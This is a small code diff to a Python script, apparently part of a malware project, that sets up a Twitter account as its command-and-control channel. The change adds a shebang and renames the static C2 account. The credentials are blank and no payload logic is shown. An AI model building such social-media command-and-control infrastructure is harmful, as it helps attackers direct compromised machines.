@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 # TODO do we need all these import statements?
 from tweepy import OAuthHandler
 from tweepy import API
@@ -14,7 +15,7 @@ ACCESS_TOKEN_SECRET = ''
 
 # The static account to which the malware connects.
 # TODO actually create this twitter account.
-STATIC_C2_ACCOUNT = 'lucius_cornelius_sulla_felix_2017'
+STATIC_C2_ACCOUNT = 'Sulla09366348'
 
 
 def main():
